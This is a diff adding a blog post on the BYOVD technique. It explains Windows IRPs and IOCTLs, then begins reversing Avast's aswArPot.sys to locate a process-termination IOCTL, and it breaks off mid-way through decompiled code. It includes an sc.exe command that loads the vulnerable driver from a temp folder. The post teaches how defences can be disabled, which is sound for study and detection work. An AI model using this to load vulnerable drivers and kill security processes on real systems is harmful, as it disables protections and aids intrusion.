@@ -1,0 +1,1762 @@
+---
+layout: post
+title:  BYOVD
+date:   2024-12-06 00:08:01 +0300
+image:  2024-12-06-happiness.jpg
+tags:   [note,Windows]
+---
+
+To communicate with a software driver running in the kernel, an application running in user-mode must use functions from the Windows API performing syscalls.
+
+In a nutshell, the functions from the Windows API performing syscalls are located in `ntdll.dll` and `win32u.dll`.
+
+When a function from those DLLs performs a syscall the execution flow is forwarded to the kernel. Then, the code of the related function is located and executed.
+
+The `I/O Manager` is a set of functions in charge of the communication with drivers for I/O operations (functions starting with `Io*`). When a Windows API function needs to perform an I/O operation (network operation, filesystem operation, etc), the Kernel code of your function, will end up calling functions of the `I/O Manager`.
+
+To communicate with the drivers the `I/O Manager` uses an `IRP (I/O Request Packet)` data strucuture (details incoming, see a bit below).
+
+The `I/O Manager`’s job in this case is to create an `IRP` with elements transmitted from the user-mode call, then locate and send the `IRP` to the appropriate driver.
+
+Finally, using the information embedded in the `IRP`, the driver will perform the required task.
+
+If it’s a software driver the end is here (well, not really but simplification remember). However, if it’s a hardware driver, `Hardware Abstraction Layer` functions of `ntoskrnl.exe` will be called (functions starting with `Hal*`).
+
+The purpose of `Hal*` functions is to communicate with the hardware, you can think of it as the last layer of the kernel before the hardware.
+
+The main purpose of a software driver is to access data structure exclusively accessible in Kernel Mode. In this article, we will focus only on those.
+
+### IRP (I/O Request Packet)
+
+`IRP (I/O Request Packet)` is a data structure, built by the `I/O Manager`, used to communicate with a driver.
+
+This structure looks like this:
+
+```assembly
+typedef struct _IRP {
+  CSHORT                    Type;
+  USHORT                    Size;
+  PMDL                      MdlAddress;
+  ULONG                     Flags;
+  union {
+    struct _IRP     *MasterIrp;
+    __volatile LONG IrpCount;
+    PVOID           SystemBuffer;
+  } AssociatedIrp;
+  LIST_ENTRY                ThreadListEntry;
+  IO_STATUS_BLOCK           IoStatus;
+  KPROCESSOR_MODE           RequestorMode;
+  BOOLEAN                   PendingReturned;
+  CHAR                      StackCount;
+  CHAR                      CurrentLocation;
+  BOOLEAN                   Cancel;
+  KIRQL                     CancelIrql;
+  CCHAR                     ApcEnvironment;
+  UCHAR                     AllocationFlags;
+  union {
+    PIO_STATUS_BLOCK UserIosb;
+    PVOID            IoRingContext;
+  };
+  PKEVENT                   UserEvent;
+  union {
+    struct {
+      union {
+        PIO_APC_ROUTINE UserApcRoutine;
+        PVOID           IssuingProcess;
+      };
+      union {
+        PVOID                 UserApcContext;
+#if ...
+        _IORING_OBJECT        *IoRing;
+#else
+        struct _IORING_OBJECT *IoRing;
+#endif
+      };
+    } AsynchronousParameters;
+    LARGE_INTEGER AllocationSize;
+  } Overlay;
+  __volatile PDRIVER_CANCEL CancelRoutine;
+  PVOID                     UserBuffer;
+  union {
+    struct {
+      union {
+        KDEVICE_QUEUE_ENTRY DeviceQueueEntry;
+        struct {
+          PVOID DriverContext[4];
+        };
+      };
+      PETHREAD     Thread;
+      PCHAR        AuxiliaryBuffer;
+      struct {
+        LIST_ENTRY ListEntry;
+        union {
+          struct _IO_STACK_LOCATION *CurrentStackLocation;
+          ULONG                     PacketType;
+        };
+      };
+      PFILE_OBJECT OriginalFileObject;
+    } Overlay;
+    KAPC  Apc;
+    PVOID CompletionKey;
+  } Tail;
+} IRP;
+```
+
+As you can see there is a lot of information, but we’ll focus exclusively on `*CurrentStackLocation`.
+
+An `IRP` always comes with at least one `IO_STACK_LOCATION` structure. A simple action in user-mode can trigger the usage of a series of drivers. This implies that a single `IRP` can hold several `IO_STACK_LOCATION`. Depending on the position in the series of drivers, the `IO_STACK_LOCATION` varies, and the proper one in context is stored in `*CurrentStackLocation`.
+
+The `IO_STACK_LOCATION` structure contains a *HUGE* union (the `Parameters` entry):
+
+```assembly
+typedef struct _IO_STACK_LOCATION {
+  UCHAR                  MajorFunction;
+  UCHAR                  MinorFunction;
+  UCHAR                  Flags;
+  UCHAR                  Control;
+  union {
+    struct {
+      PIO_SECURITY_CONTEXT     SecurityContext;
+      ULONG                    Options;
+      USHORT POINTER_ALIGNMENT FileAttributes;
+      USHORT                   ShareAccess;
+      ULONG POINTER_ALIGNMENT  EaLength;
+    } Create;
+    struct {
+      PIO_SECURITY_CONTEXT          SecurityContext;
+      ULONG                         Options;
+      USHORT POINTER_ALIGNMENT      Reserved;
+      USHORT                        ShareAccess;
+      PNAMED_PIPE_CREATE_PARAMETERS Parameters;
+    } CreatePipe;
+    struct {
+      PIO_SECURITY_CONTEXT        SecurityContext;
+      ULONG                       Options;
+      USHORT POINTER_ALIGNMENT    Reserved;
+      USHORT                      ShareAccess;
+      PMAILSLOT_CREATE_PARAMETERS Parameters;
+    } CreateMailslot;
+    struct {
+      ULONG                   Length;
+      ULONG POINTER_ALIGNMENT Key;
+      ULONG                   Flags;
+      LARGE_INTEGER           ByteOffset;
+    } Read;
+    struct {
+      ULONG                   Length;
+      ULONG POINTER_ALIGNMENT Key;
+      ULONG                   Flags;
+      LARGE_INTEGER           ByteOffset;
+    } Write;
+    struct {
+      ULONG                   Length;
+      PUNICODE_STRING         FileName;
+      FILE_INFORMATION_CLASS  FileInformationClass;
+      ULONG POINTER_ALIGNMENT FileIndex;
+    } QueryDirectory;
+    struct {
+      ULONG                   Length;
+      ULONG POINTER_ALIGNMENT CompletionFilter;
+    } NotifyDirectory;
+    struct {
+      ULONG                                                Length;
+      ULONG POINTER_ALIGNMENT                              CompletionFilter;
+      DIRECTORY_NOTIFY_INFORMATION_CLASS POINTER_ALIGNMENT DirectoryNotifyInformationClass;
+    } NotifyDirectoryEx;
+    struct {
+      ULONG                                    Length;
+      FILE_INFORMATION_CLASS POINTER_ALIGNMENT FileInformationClass;
+    } QueryFile;
+    struct {
+      ULONG                                    Length;
+      FILE_INFORMATION_CLASS POINTER_ALIGNMENT FileInformationClass;
+      PFILE_OBJECT                             FileObject;
+      union {
+        struct {
+          BOOLEAN ReplaceIfExists;
+          BOOLEAN AdvanceOnly;
+        };
+        ULONG  ClusterCount;
+        HANDLE DeleteHandle;
+      };
+    } SetFile;
+    struct {
+      ULONG                   Length;
+      PVOID                   EaList;
+      ULONG                   EaListLength;
+      ULONG POINTER_ALIGNMENT EaIndex;
+    } QueryEa;
+    struct {
+      ULONG Length;
+    } SetEa;
+    struct {
+      ULONG                                  Length;
+      FS_INFORMATION_CLASS POINTER_ALIGNMENT FsInformationClass;
+    } QueryVolume;
+    struct {
+      ULONG                                  Length;
+      FS_INFORMATION_CLASS POINTER_ALIGNMENT FsInformationClass;
+    } SetVolume;
+    struct {
+      ULONG                   OutputBufferLength;
+      ULONG POINTER_ALIGNMENT InputBufferLength;
+      ULONG POINTER_ALIGNMENT FsControlCode;
+      PVOID                   Type3InputBuffer;
+    } FileSystemControl;
+    struct {
+      PLARGE_INTEGER          Length;
+      ULONG POINTER_ALIGNMENT Key;
+      LARGE_INTEGER           ByteOffset;
+    } LockControl;
+    struct {
+      ULONG                   OutputBufferLength;
+      ULONG POINTER_ALIGNMENT InputBufferLength;
+      ULONG POINTER_ALIGNMENT IoControlCode;
+      PVOID                   Type3InputBuffer;
+    } DeviceIoControl;
+    struct {
+      SECURITY_INFORMATION    SecurityInformation;
+      ULONG POINTER_ALIGNMENT Length;
+    } QuerySecurity;
+    struct {
+      SECURITY_INFORMATION SecurityInformation;
+      PSECURITY_DESCRIPTOR SecurityDescriptor;
+    } SetSecurity;
+    struct {
+      PVPB           Vpb;
+      PDEVICE_OBJECT DeviceObject;
+      ULONG          OutputBufferLength;
+    } MountVolume;
+    struct {
+      PVPB           Vpb;
+      PDEVICE_OBJECT DeviceObject;
+    } VerifyVolume;
+    struct {
+      struct _SCSI_REQUEST_BLOCK *Srb;
+    } Scsi;
+    struct {
+      ULONG                       Length;
+      PSID                        StartSid;
+      PFILE_GET_QUOTA_INFORMATION SidList;
+      ULONG                       SidListLength;
+    } QueryQuota;
+    struct {
+      ULONG Length;
+    } SetQuota;
+    struct {
+      DEVICE_RELATION_TYPE Type;
+    } QueryDeviceRelations;
+    struct {
+      const GUID *InterfaceType;
+      USHORT     Size;
+      USHORT     Version;
+      PINTERFACE Interface;
+      PVOID      InterfaceSpecificData;
+    } QueryInterface;
+    struct {
+      PDEVICE_CAPABILITIES Capabilities;
+    } DeviceCapabilities;
+    struct {
+      PIO_RESOURCE_REQUIREMENTS_LIST IoResourceRequirementList;
+    } FilterResourceRequirements;
+    struct {
+      ULONG                   WhichSpace;
+      PVOID                   Buffer;
+      ULONG                   Offset;
+      ULONG POINTER_ALIGNMENT Length;
+    } ReadWriteConfig;
+    struct {
+      BOOLEAN Lock;
+    } SetLock;
+    struct {
+      BUS_QUERY_ID_TYPE IdType;
+    } QueryId;
+    struct {
+      DEVICE_TEXT_TYPE       DeviceTextType;
+      LCID POINTER_ALIGNMENT LocaleId;
+    } QueryDeviceText;
+    struct {
+      BOOLEAN                                          InPath;
+      BOOLEAN                                          Reserved[3];
+      DEVICE_USAGE_NOTIFICATION_TYPE POINTER_ALIGNMENT Type;
+    } UsageNotification;
+    struct {
+      SYSTEM_POWER_STATE PowerState;
+    } WaitWake;
+    struct {
+      PPOWER_SEQUENCE PowerSequence;
+    } PowerSequence;
+#if ...
+    struct {
+      union {
+        ULONG                      SystemContext;
+        SYSTEM_POWER_STATE_CONTEXT SystemPowerStateContext;
+      };
+      POWER_STATE_TYPE POINTER_ALIGNMENT Type;
+      POWER_STATE POINTER_ALIGNMENT      State;
+      POWER_ACTION POINTER_ALIGNMENT     ShutdownType;
+    } Power;
+#else
+    struct {
+      ULONG                              SystemContext;
+      POWER_STATE_TYPE POINTER_ALIGNMENT Type;
+      POWER_STATE POINTER_ALIGNMENT      State;
+      POWER_ACTION POINTER_ALIGNMENT     ShutdownType;
+    } Power;
+#endif
+    struct {
+      PCM_RESOURCE_LIST AllocatedResources;
+      PCM_RESOURCE_LIST AllocatedResourcesTranslated;
+    } StartDevice;
+    struct {
+      ULONG_PTR ProviderId;
+      PVOID     DataPath;
+      ULONG     BufferSize;
+      PVOID     Buffer;
+    } WMI;
+    struct {
+      PVOID Argument1;
+      PVOID Argument2;
+      PVOID Argument3;
+      PVOID Argument4;
+    } Others;
+  } Parameters;
+  PDEVICE_OBJECT         DeviceObject;
+  PFILE_OBJECT           FileObject;
+  PIO_COMPLETION_ROUTINE CompletionRoutine;
+  PVOID                  Context;
+} IO_STACK_LOCATION, *PIO_STACK_LOCATION;
+```
+
+We are going to focus only on `MajorFunction` and some structures of `Parameters`.
+
+`MajorFunction` contains the `IRP major function code`, which tells the driver what operation it should carry out.
+
+- **IRP_MJ_CREATE**: when `NtCreateFile()` (from user-mode) or `ZwCreateFile()` (from kernel mode) is called on the driver.
+- **IRP_MJ_CLOSE**: when `NtClose()` (from user-mode) or `ZwClose()` (from kernel mode) is called on the driver.
+- **IRP_MJ_DEVICE_CONTROL**: when `NtDeviceIoControlFile()` (from user-mode) or `ZwDeviceIoControlFile()` (from kernel mode) is called on the driver.
+- **IRP_MJ_READ**
+- **IRP_MJ_WRITE**
+- **IRP_MJ_CLEANUP**
+- **IRP_MJ_FILE_SYSTEM_CONTROL**
+- **IRP_MJ_FLUSH_BUFFERS**
+- **IRP_MJ_INTERNAL_DEVICE_CONTROL**
+- **IRP_MJ_PNP**
+- **IRP_MJ_POWER**
+- **IRP_MJ_QUERY_INFORMATION**
+- **IRP_MJ_SET_INFORMATION**
+- **IRP_MJ_SHUTDOWN**
+- **IRP_MJ_SYSTEM_CONTROL**
+
+We’ll only use `IRP_MJ_CREATE`, `IRP_MJ_CLOSE` and the most important for us: `IRP_MJ_DEVICE_CONTROL`.
+
+What you need to remember here, is that when you interact with a driver using functions such as `NtCreateFile()`, `NtClose()`, or `NtDeviceIoControlFile()` a value related to the action you want to perform is stored in the `MajorFunction` element of the `IRP` that will be built for your driver.
+
+When using the `DeviceIoControl()`, `NtDeviceIoControlFile()` or `ZwDeviceIoControlFile()` the structure in the `Parameters` is `DeviceIoControl`.
+
+```assembly
+struct {
+    ULONG                   OutputBufferLength;
+    ULONG POINTER_ALIGNMENT InputBufferLength;
+    ULONG POINTER_ALIGNMENT IoControlCode;
+    PVOID                   Type3InputBuffer;
+} DeviceIoControl;
+```
+
+`DeviceIoControl()` functions are used to communicate with the driver when you want it to perform a specific dedicated action. `DeviceIoControl()` functions take amongst their parameters:
+
+- a handle on the drivers that you want to communicate with;
+- an `IoControlCode` (also called `IOCTL`).
+
+This code will be stored in the `IO_STACK_LOCATION` at `Parameters.DeviceIoControl.IoControlCode`.
+
+### IOCTL (I/O Control Code)
+
+`IOCTL` are crucial in the communication between user-mode and drivers. An `IOCTL` is a 32 bits value used to identify a specific function in a driver.
+
+Let’s say that you developed your EDR product with an agent in user-mode and a kernel driver. You want to be able to kill processes using your kernel mode driver and using a PID provided from the user-mode agent.
+
+To do so you’ll need to use `DeviceIoControl()` from the agent on the EDR driver. The `DeviceIoControl()` function will need the `IOCTL` of the process termination function implemented in the driver and the process `PID` that you want to kill.
+
+This `IOCTL` is written by the `I/O Manager` in the `IO_STACK_LOCATION` of the `IRP` during its creation and sent to the EDR driver.
+
+Then the driver uses the current `IO_STACK_LOCATION` of the `IRP` to find out which task is required using the `MajorFunction` field. If the content of the field is `IRP_MJ_DEVICE_CONTROL` then the `IOCTL` code will be retrieved in the field `Parameters.DeviceIoControl.IoControlCode`.
+
+Finally, the driver executes the function in its code related to the `IOCTL`, which in our case is a process termination function. The `PID` is retrieved by the function code using a buffer that contains the data (`PID` in our case) provided via the `DeviceIoControl()` function.
+
+`IOCTL` are defined by the driver developers. **`IOCTL` are based on strict rules and cannot be random**.
+
+They carry 4 pieces of information:
+
+- **DeviceType**: type of device can be [one of the following](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/specifying-device-types). However, in our case (software driver) most of the time the type is going to be `FILE_DEVICE_UNKNOWN` (`0x22`) or a value between `0x8000 and 0xFFFF`.
+- **FunctionCode**: code identifiying the function in your driver. It must be unique for a same device type. The value ranges from `0x800` to `0xFFF`. Function codes under `0x800` are restricted to Microsoft.
+- **TransferType**: indicates how the system will pass data between the caller and the driver handling the `IRP`.
+- **RequiredAccess**: indicates the type of access that a caller must request when opening the file object that represents the device (Read, Write, etc).
+
+To create the `IOCTL` code the developers use the Windows `CTL_CODE` macro that takes the 4 arguments:
+
+```assembly
+CTL_CODE(DeviceType, Function, Method, Access)
+```
+
+This performs the following operation on the arguments:
+
+```assembly
+((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method))
+```
+
+Let’s do it manually:
+
+```assembly
+DeviceType = FILE_DEVICE_UNKNOWN = 0x22
+Access = FILE_ANY_ACCESS = 0x00
+Method = METHOD_NEITHER = 0x3
+Function = 0x800
+
+
+Device type = FILE_DEVICE_UNKNOWN = 00100010
+Access = FILE_ANY_ACCESS = 00
+Method = METHOD_NEITHER = 11
+Function = 100000000000
+
+                       00000000000000000000000000000000 (32 bits)
+((DeviceType) << 16) =         00100010xxxxxxxxxxxxxxxx
+((Access) << 14)     =                 00xxxxxxxxxxxxxx
+(Function) << 2     =                   100000000000xx
+(Method)                                             11
+
+OR                    ----------------------------------
+                      00000000001000100010000000000011
+
+IOCTL CODE = 0x00222003 (or 0x222003)
+```
+
+If you want to find more information about `IOCTL` you can [check the Microsoft documentation](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/defining-i-o-control-codes). If you want to play to decode `IOCTL` you can [check this fun project](https://github.com/h0mbre/ioctl.py).
+
+However, a real declaration of `IOCTL` in a driver looks like this:
+
+```assembly
+#define IOCTL_DESTROY_THE_WORLD	CTL_CODE(0x8000, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_BURN_THE_GALAXY	CTL_CODE(0x8000, 0x901, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_PET_SOME_PUPPIES	CTL_CODE(0x8000, 0x902, METHOD_BUFFERED, FILE_ANY_ACCESS)
+```
+
+### DriverEntry
+
+The `DriverEntry()` function is the main of Windows drivers, it’s the first called function after driver load.
+
+It takes 2 arguments:
+
+- **DriverObject**: pointer to a `DRIVER_OBJECT` structure.
+- **RegistryPath**: pointer to a counted Unicode string specifying the path to the driver’s registry key.
+
+Now let’s see an example of a Driver that uses `IOCTL` from user-mode (**the explanations in this chapter are in the code comments!**):
+
+In a nutshell, the key elements to keep in mind while reversing a driver searching for juicy `IOCTLs`:
+
+- the main of the Windows drivers is the `DriverEntry()`;
+- `IRP major function code` are associated with specific types of driver operation. A driver communicating with user-land via `IOCTL` code will use `IRP_MJ_CREATE`, `IRP_MJ_CLOSE` and `IRP_MJ_DEVICE_CONTROL` IRP major function code;
+- the function associated to `IRP_MJ_DEVICE_CONTROL` is the one that will process the `IOCTL` code in the driver.
+
+### LOLDrivers_finder
+
+for each available driver in the project, the list of the functions it imports is provided.
+
+A basic process killer driver requires 2 things:
+
+- a way to get an handle on a process (for instance `NtOpenProcess` or `ZwOpenProcess`);
+- a way to terminate the process (for instance `NtTerminateProcess` or `ZwTerminateProcess`).
+
+The script checks all the imported functions for each driver in the json file. If a driver has in its imported functions `Nt/ZwOpenProcess` **AND** `Nt/ZwTerminateProcess` then it will be selected as a potential process killer drivers.
+
+> Of course **there are lots of way to exploit drivers to kill processes**.
+>
+> There are also **lots of way to retrieve a handle on a process or kill it without using these functions**.
+>
+> Finally, yes **functions can be imported dynamically or retrieved by parsing the `ntdll` `EAT`**.
+
+### Case 1: AswArPot.sys - anti-rootkit driver by Avast
+
+The first candidate is the [Avast `AswArPot.sys` anti-rootkit driver](https://www.loldrivers.io/drivers/57fc510a-e649-4599-b83e-8f3605e3d1d9/).
+
+> sc.exe create aswArPot.sys binPath=C:\windows\temp\aswArPot.sys type=kernel && sc.exe start aswArPot.sys
+
+First, we open and seek references in the code for `ZwTerminateProcess()` (in IDA you search in the import tab and use the cross-reference feature).
+
+Lucky for us, the function is only used once in the code.
+
+```assembly
+__int64 __fastcall sub_14001DC80(unsigned int a1)
+{
+  NTSTATUS v1; // eax
+  unsigned int v2; // ebx
+  PVOID Object; // [rsp+30h] [rbp-39h] BYREF
+  void *ProcessHandle; // [rsp+38h] [rbp-31h] BYREF
+  struct _CLIENT_ID ClientId; // [rsp+40h] [rbp-29h] BYREF
+  struct _OBJECT_ATTRIBUTES ObjectAttributes; // [rsp+50h] [rbp-19h] BYREF
+  struct _KAPC_STATE ApcState; // [rsp+80h] [rbp+17h] BYREF
+
+  memset(&ObjectAttributes.RootDirectory, 0, 20);
+  ClientId.UniqueThread = 0i64;
+  *(_OWORD *)&ObjectAttributes.SecurityDescriptor = 0i64;
+  ClientId.UniqueProcess = (HANDLE)a1;
+  ObjectAttributes.Length = 48;
+  KeStackAttachProcess(qword_14004CD60, &ApcState);
+  v1 = ZwOpenProcess(&ProcessHandle, 1u, &ObjectAttributes, &ClientId);
+  v2 = v1 == 0;
+  if ( !v1 )
+  {
+    if ( !ObReferenceObjectByHandle(ProcessHandle, 0, 0i64, 0, &Object, 0i64) )
+    {
+      switch ( dword_14004D448 )
+      {
+        case 1281:
+          *((_DWORD *)Object + 146) &= ~0x2000u;
+          break;
+        case 1282:
+          *((_DWORD *)Object + 144) &= ~0x2000u;
+          break;
+        case 1536:
+          *((_DWORD *)Object + 138) &= ~0x2000u;
+          break;
+        case 1537:
+          *((_DWORD *)Object + 156) &= ~0x2000u;
+          break;
+        case 1538:
+          *((_DWORD *)Object + 154) &= ~0x2000u;
+          break;
+      }
+      ObfDereferenceObject(Object);
+    }
+    v2 = ZwTerminateProcess(ProcessHandle, 0);
+    ZwClose(ProcessHandle);
+  }
+  KeUnstackDetachProcess(&ApcState);
+  return v2;
+}
+```
+
+`ZwOpenProcess()` retrieves a process handle just before passing it as an argument to `ZwTerminateProcess()`. 
+
+```assembly
+NTSYSAPI NTSTATUS ZwOpenProcess(
+  [out]          PHANDLE            ProcessHandle,
+  [in]           ACCESS_MASK        DesiredAccess,
+  [in]           POBJECT_ATTRIBUTES ObjectAttributes,
+  [in, optional] PCLIENT_ID         ClientId
+);
+```
+
+* [out] ProcessHandle
+
+  A pointer to a variable of type HANDLE. The **ZwOpenProcess** routine writes the process handle to the variable that this parameter points to.
+
+* [in] DesiredAccess
+
+  An [ACCESS_MASK](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/access-mask) value that contains the access rights that the caller has requested to the process object.
+
+* [in] ObjectAttributes
+
+  A pointer to an [**OBJECT_ATTRIBUTES**](https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_object_attributes) structure that specifies the attributes to apply to the process object handle. The **ObjectName** field of this structure must be set to **NULL**. For more information, see the following Remarks section.
+
+* [in, optional] ClientId
+
+  A pointer to a client ID that identifies the thread whose process is to be opened. This parameter must be a non-**NULL** pointer to a valid client ID. For more information, see the following Remarks section.
+
+The **CLIENT_ID** structure contains identifiers of a process and a thread.
+
+```assembly
+ typedef struct _CLIENT_ID {
+   HANDLE UniqueProcess;  // process ID（PID）
+   HANDLE UniqueThread;   // thread ID（TID）
+ } CLIENT_ID;
+```
+
+* **UniqueProcess:** Unique process identifier.
+
+* **UniqueThread:** Unique thread identifier.
+
+Good. Now let’s see, using the cross-reference magic, where this chunk of code is called.
+
+```assembly
+__int64 __fastcall sub_140018FF8(
+        __int64 a1,
+        _QWORD *a2,
+        unsigned int a3,
+        _DWORD *a4,
+        unsigned int a5,
+        int a6,
+        _QWORD *a7,
+        __int64 a8)
+{
+  unsigned int v10; // r14d
+  PEPROCESS *v11; // r15
+  int v12; // edx
+  unsigned int v13; // r12d
+  int v14; // ecx
+  __int64 result; // rax
+  __int64 v16; // rax
+  __int64 v17; // rbx
+  const void *v18; // rdx
+  unsigned int v19; // eax
+  void *v20; // r15
+  _QWORD *v21; // r14
+  _QWORD *v22; // rax
+  int i; // eax
+  __int64 v24; // rcx
+  __int64 v25; // rax
+  _QWORD *v26; // rbx
+  PEPROCESS v27; // rcx
+  void *v28; // rcx
+  __int64 v29; // rbx
+  void *v30; // r14
+  __int64 v31; // rbx
+  int v32; // eax
+  _OWORD *Pool; // rax
+  _WORD *v34; // r14
+  unsigned __int16 v35; // ax
+  _WORD *v36; // rax
+  _QWORD *v37; // rax
+  struct _IO_WORKITEM *WorkItem; // rax
+  void *v39; // rcx
+  int v40; // eax
+  PVOID v41; // r14
+  unsigned int v42; // eax
+  void *v43; // r14
+  int v44; // eax
+  __int64 v45; // rdx
+  POBJECT_HANDLE_INFORMATION HandleInformation; // [rsp+28h] [rbp-D0h]
+  size_t MaxCount; // [rsp+40h] [rbp-B8h] BYREF
+  PEPROCESS Process; // [rsp+48h] [rbp-B0h] BYREF
+  PEPROCESS PROCESS; // [rsp+50h] [rbp-A8h] BYREF
+  struct _UNICODE_STRING DestinationString; // [rsp+58h] [rbp-A0h] BYREF
+  PVOID P; // [rsp+68h] [rbp-90h] BYREF
+  HANDLE Handle; // [rsp+70h] [rbp-88h] BYREF
+  void *v53; // [rsp+78h] [rbp-80h]
+  int v54; // [rsp+80h] [rbp-78h]
+  struct _KAPC_STATE ApcState; // [rsp+88h] [rbp-70h] BYREF
+
+  v10 = a3;
+  v11 = (PEPROCESS *)a4;
+  *(_QWORD *)&DestinationString.Length = a7;
+  v12 = a8;
+  v13 = 0;
+  LODWORD(MaxCount) = 0;
+  dword_14004D390 = -1073741808;
+  v14 = a6;
+  switch ( a6 )
+  {
+    case -1719091196:
+      if ( a5 >= 4 && a4 )
+      {
+        *a4 = 1;
+        a7[1] = 4i64;
+        *(_DWORD *)a7 = 0;
+        return 0i64;
+      }
+      goto LABEL_194;
+    case -1719091120:
+      if ( qword_14004CD68 )
+        _guard_dispatch_icall_fptr(1i64);
+      *(_DWORD *)a7 = 0;
+      return 0i64;
+    case -1719091136:
+      if ( a3 == 8 && a2 && a5 && a4 )
+      {
+        v16 = sub_1400189C8(*a2, a8);
+        v17 = v16;
+        if ( v16 && (v18 = *(const void **)(v16 + 24)) != 0i64 && (v19 = *(_DWORD *)(v16 + 32), v19 == a5) )
+        {
+          memmove(v11, v18, v19);
+          a7[1] = *(unsigned int *)(v17 + 32);
+          *(_DWORD *)a7 = 0;
+          return 0i64;
+        }
+        else
+        {
+          result = 3221225704i64;
+          *(_DWORD *)a7 = -1073741592;
+        }
+        return result;
+      }
+LABEL_194:
+      result = 3221225990i64;
+      goto LABEL_113;
+  }
+  if ( a6 != -1719091132 )
+  {
+    if ( a6 == -1719091124 )
+    {
+      if ( a3 == 8 && a2 )
+      {
+        v25 = sub_1400189C8(*a2, a8);
+        v26 = (_QWORD *)v25;
+        if ( v25 )
+        {
+          sub_140018A04(v25);
+          v26[1] = 0i64;
+          v26[2] = 0i64;
+          *v26 = 0i64;
+          a7[1] = 0i64;
+          *(_DWORD *)a7 = 0;
+          return 0i64;
+        }
+        else
+        {
+          result = 3221225704i64;
+          *(_DWORD *)a7 = -1073741592;
+        }
+        return result;
+      }
+      goto LABEL_194;
+    }
+    if ( ((a6 + 1719091192) & 0xFFFFFFFB) == 0 )
+      return *(unsigned int *)a7;
+    if ( ((a6 + 1719091068) & 0xFFFFFFF3) == 0 && a6 != -1719091056 )
+    {
+      if ( a5 < 4 || !a4 || a3 < 4 || !a2 )
+        goto LABEL_194;
+      if ( a6 == -1719091068 )
+      {
+        if ( MmIsAddressValid((PVOID)*a2) )
+        {
+          result = sub_14001DA0C(*a2, v11, a5);
+          dword_14004D390 = result;
+          if ( !(_DWORD)result )
+          {
+            *(_DWORD *)a7 = 0;
+            a7[1] = a5;
+            return result;
+          }
+          result = sub_14001D7BC(*a2, v11, a5);
+          dword_14004D390 = result;
+          if ( !(_DWORD)result )
+          {
+            *(_DWORD *)a7 = 0;
+            a7[1] = a5;
+            return result;
+          }
+        }
+      }
+      else if ( a6 == -1719091064 && a5 >= 8 )
+      {
+        dword_14004D390 = PsLookupProcessByProcessId((HANDLE)*(unsigned int *)a2, &Process);
+        if ( !dword_14004D390 )
+        {
+          v27 = Process;
+          *v11 = Process;
+          ObfDereferenceObject(v27);
+          *(_DWORD *)a7 = 0;
+          a7[1] = a5;
+          return 0i64;
+        }
+      }
+      return *(unsigned int *)a7;
+    }
+    switch ( a6 )
+    {
+      case 0x9988C080:
+        if ( a5 < 4 || !a4 )
+          goto LABEL_194;
+        v28 = (void *)sub_14001D150(&MaxCount, a8);
+        if ( v28 && (unsigned int)MaxCount <= a5 )
+        {
+          v29 = (unsigned int)MaxCount;
+          memmove(v11, v28, (unsigned int)MaxCount);
+          a7[1] = v29;
+          *(_DWORD *)a7 = 0;
+          return 0i64;
+        }
+        *(_DWORD *)a7 = -1073741306;
+        if ( v28 )
+          ExFreePoolWithTag(v28, 0);
+        return *(unsigned int *)a7;
+      case 0x9988C090:
+        if ( a5 < 4 || !a4 )
+          goto LABEL_194;
+        v30 = (void *)sub_14001C9FC(16i64, &MaxCount);
+        if ( v30 )
+        {
+          if ( (unsigned int)MaxCount <= a5 )
+          {
+            v31 = (unsigned int)MaxCount;
+            memmove(v11, v30, (unsigned int)MaxCount);
+            a7[1] = v31;
+            *(_DWORD *)a7 = 0;
+            ExFreePoolWithTag(v30, 0);
+            return *(unsigned int *)a7;
+          }
+          if ( a5 == 4 )
+          {
+            *(_DWORD *)v11 = MaxCount;
+            a7[1] = 4i64;
+            *(_DWORD *)a7 = 0;
+            ExFreePoolWithTag(v30, 0);
+            return *(unsigned int *)a7;
+          }
+          ExFreePoolWithTag(v30, 0);
+        }
+        return *(unsigned int *)a7;
+      case 0x9988C0C0:
+        if ( a5 < 4 || !a4 || a3 < 4 || !a2 )
+          goto LABEL_194;
+        dword_14004D390 = sub_140018958(qword_14004CD60, a8);
+        if ( dword_14004D390 )
+          goto LABEL_107;
+        v32 = sub_14001A924(a2, v10, v11, a5);
+        goto LABEL_106;
+      case 0x9988C0C4:
+        if ( a3 < 4 || !a2 )
+          goto LABEL_194;
+        dword_14004D390 = sub_140018958(qword_14004CD60, a8);
+        if ( dword_14004D390 )
+          goto LABEL_107;
+        v32 = sub_14001AD4C(a2, v10);
+        goto LABEL_106;
+      case 0x9988C054:
+        if ( a3 >= 0x20 && a2 )
+        {
+          if ( *(_DWORD *)a2 <= a3 )
+          {
+            dword_14004D390 = sub_140018958(qword_14004CD60, a8);
+            if ( !dword_14004D390 )
+            {
+              *(_DWORD *)a7 = sub_14001B9B0(a2);
+              KeDetachProcess();
+            }
+            a7[1] = 0i64;
+            return *(unsigned int *)a7;
+          }
+          else
+          {
+            result = 3221225990i64;
+            *(_DWORD *)a7 = -1073741306;
+          }
+        }
+        else
+        {
+          result = 3221225990i64;
+          *(_DWORD *)a7 = -1073741306;
+        }
+        return result;
+      case 0x9988C0D0:
+        if ( a3 < 4 || !a2 )
+          goto LABEL_194;
+        sub_14001B394(a2, a3);
+        *(_DWORD *)a7 = 0;
+        goto LABEL_107;
+      case 0x9988C0C8:
+        if ( a3 < 4 || !a2 )
+          goto LABEL_194;
+        dword_14004D390 = sub_140018958(qword_14004CD60, a8);
+        if ( dword_14004D390 )
+          goto LABEL_107;
+        v32 = sub_14001B51C(a2, v10);
+LABEL_106:
+        *(_DWORD *)a7 = v32;
+        KeDetachProcess();
+LABEL_107:
+        a7[1] = a5;
+        return *(unsigned int *)a7;
+      case 0x9988C0D4:
+        if ( a3 < 4 || !a2 )
+          goto LABEL_194;
+        Pool = ExAllocatePool(PagedPool, 0x28ui64);
+        v34 = Pool;
+        if ( !Pool )
+        {
+          result = 3221225626i64;
+LABEL_113:
+          *(_DWORD *)a7 = result;
+          return result;
+        }
+        *Pool = 0i64;
+        Pool[1] = 0i64;
+        *((_QWORD *)Pool + 4) = 0i64;
+        *((_QWORD *)Pool + 2) = MEMORY[0xFFFFF78000000014];
